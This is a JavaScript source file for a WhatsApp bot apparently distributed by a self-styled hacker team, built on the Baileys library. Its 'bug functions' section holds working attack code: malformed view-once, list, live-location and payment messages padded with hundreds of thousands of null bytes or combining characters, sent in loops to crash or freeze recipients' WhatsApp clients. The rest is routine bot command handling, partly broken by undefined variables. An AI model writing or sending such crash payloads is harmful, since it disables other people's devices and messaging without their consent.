//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
                                                                                                                                                     
                                                                                                                                                                                                                                                              
                                                        /*  AVI OFC , TEAM AVI HAKER'S */                                                                               
                                                                                                                                                     
                                                                                                                                                                                    
                                                                                                                                                     
//═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════


const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

/*|⬡════════════════════════════════════════════|❝   𝙰vi - bug database ™ ❞|═══════════════════════════════════════════⬡|*/ 

const { avitext1 } = require('./attac/AVI1')
const { avitext2 } = require('./attac/AVI2')
const { avitext3 } = require('./attac/AVI3')
const { avitext4 } = require('./attac/AVI4')
const { avitext5 } = require('./attac/AVI5')
const { avitext6 } = require('./attac/AVI6')
const { avitext7 } = require('./attac/AVI7')
const { avitext8 } = require('./attac/AVI8')
const { avitext9 } = require('./attac/AVI9')
const { avitext10 } = require('./attac/AVI10')
const wkwk = fs.readFileSync(`./attac/AVI.mp3`)
const xsteek = fs.readFileSync(`./attac/x.webp`)
const o = fs.readFileSync(`./attac/o.jpg`)

/*|⬡════════════════════════════════════════════|❝   𝙰vi -  database ™ ❞|═══════════════════════════════════════════⬡|*/ 

let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))


/*|⬡════════════════════════════════════════════|❝   𝙰vi - autorep ™ ❞|═══════════════════════════════════════════⬡|*/ 

const VoiceNoteAvi = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerAvi = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageAvi = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoAvi = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocAvi = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipAvi = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkAvi = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

/*|⬡════════════════════════════════════════════|❝   𝙰vi - time  ™ ❞|═══════════════════════════════════════════⬡|*/ 


/*|⬡════════════════════════════════════════════|❝   𝙰vi - xnxxx ™ ❞|═══════════════════════════════════════════⬡|*/ 

const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js');



/*|⬡════════════════════════════════════════════|❝   𝙰vi -  ™ ❞|═══════════════════════════════════════════⬡|*/ 


const xtime = moment.tz('Asia/colombo').format('HH:mm:ss')
        const xdate = moment.tz('Asia/colombo').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/colombo').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var avitimewisher =`welcome`
 }
 if(time2 < "19:00:00"){
var avitimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var avitimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var avitimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var avitimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var avitimewisher = `Good Morning 🌄`
 } 

 //theme text
// let setv = pickRandom(global.listv)

module.exports = Avishka = async (Avishka, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcAvi.selectedRowId : (m.mtype == 'templateButtonreplygcAviMessage') ? m.message.templateButtonreplygcAviMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcAvi.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Avishka.decodeJid(Avishka.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Avishka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = Avishka.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? Avishka.user.id.split(':')[0] + "@s.whatsapp.net" || Avishka.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(Avishka, m, premium);

     //   function pickRandom(list) {
   //       return list[Math.floor(list.length * Math.random())]
  //      }

//group chat msg by Avi

const replygcAvi = (teks) => {
Avishka.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./AMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

//bug functions

const sendReaction = async reactionContent => {
  Avishka.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   Avishka.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    Avishka.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Avishka.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await Avishka.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Avishka.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  Avishka.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  Avishka.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Avishka.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Avishka.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const Aviimun = (texto) => {
Avishka.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_Avimrbot = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Avi ' hack3r team`
}}
}
async function Avicrashy(Avimrbot,chat) {
Avishka.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${Avimrbot}.${xeontext1}` ,
caption: `${Avimrbot + xeontext1}`,
}, {quoted: subscribe_Avimrbot })
}

//end bug functions

async function loading () {
var aviload = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ⚠..."
]
let { key } = await Avishka.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < aviload.length; i++) {
await Avishka.sendMessage(from, {text: aviload[i], edit: key });
}
}

        if (!Avishka.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            Avishka.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        Avishka.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        Avishka.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        Avishka.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        Avishka.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            Avishka.updateProfileStatus(``).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return Avishka.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await Avishka.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Avishka.getName(i)}\nFN:${await Avishka.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteAvi) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./AMedia/audio/${BhosdikaXeon}.mp3`)
Avishka.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerAvi){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./AMedia/sticker/${BhosdikaXeon}.webp`)
Avishka.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageAvi){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./AMedia/image/${BhosdikaXeon}.jpg`)
Avishka.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoAvi){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./AMedia/video/${BhosdikaXeon}.mp4`)
Avishka.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
Avishka.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkAvi) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./AMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
Avishka.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipAvi) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./AMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocAvi) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./AMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcAvi(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                Avishka.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 2)
                    return replygcAvi(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcAvi("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcAvi("Success")
                }
                await sendReaction('✔');
                break
            case 'delprem':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcAvi("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcAvi("Success")
                }
                await sendReaction('✔');
                break
            case 'listprem':
                await sendReaction('⏳');
                 {
                if (!isCreator) return replygcAvi(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                Avishka.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            await sendReaction('✔');
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession':
                await sendReaction('⏳');
                 {
                if (!isCreator) return replygcAvi(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcAvi('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcAvi(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcAvi(teks)
                    await sleep(2000)
                    replygcAvi("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcAvi("Successfully deleted all the trash in the session folder")
                });
            }
            await sendReaction('✔');
            break
            case 'join':
                await sendReaction('⏳');
                try {
                    if (!isCreator) return replygcAvi(mess.owner)
                    if (!text) return replygcAvi('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcAvi('Link Invalid!')
                    replygcAvi(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await Avishka.groupAcceptInvite(result).then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                } catch {
                    replygcAvi('Failed to join the Group')
                }
                await sendReaction('✔');
                break      
            case 'getsession':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                replygcAvi('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                Avishka.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'shutdown':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                replygcAvi(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                await sendReaction('✔');
                break
            case 'restart':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                replygcAvi('In Process....')
                exec('pm2 restart all')
                await sendReaction('✔');
                break
            case 'autoread':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcAvi(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcAvi(`Successfully changed autoread to ${q}`)
                }
                await sendReaction('✔');
                break
                case 'autotyping':
                    await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcAvi(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcAvi(`Successfully changed auto-typing to ${q}`)
                }
                await sendReaction('✔');
                break
                case 'autorecording':
                    await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcAvi(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcAvi(`Successfully changed auto-recording to ${q}`)
                }
                await sendReaction('✔');
                break
                case 'autorecordtyp':
                    await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcAvi(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcAvi(`Successfully changed auto recording and typing to ${q}`)
                }
                await sendReaction('✔');
                break
                case 'autoswview':
    case 'autostatusview':
        await sendReaction('⏳');
        {
             if (!isCreator) return replygcAvi(mess.owner)
               if (args.length < 1) return replygcAvi('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcAvi(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcAvi(`${command} is disabled`)
               }
            }
            await sendReaction('✔');
            break
            case 'autobio':
                await sendReaction('⏳');
